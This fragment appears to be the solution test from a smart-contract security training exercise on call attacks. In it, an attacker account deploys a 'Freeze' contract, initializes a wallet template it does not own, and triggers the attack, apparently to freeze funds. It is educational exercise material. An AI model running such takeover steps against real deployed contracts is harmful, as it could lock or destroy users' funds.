...
describe('Calls Attacks Exercise 4', function () {
    ...
    it('Exploit', async function () {
        ...
        const FreezeFactory = await ethers.getContractFactory(
            'contracts/call-attacks-4/Freeze.sol:Freeze',
            attacker
        );
        this.freeze = await FreezeFactory.deploy(this.blockSafeTemplate.address);

        await this.blockSafeTemplate.connect(attacker).initialize([this.freeze.address]);

        await this.freeze.attack();
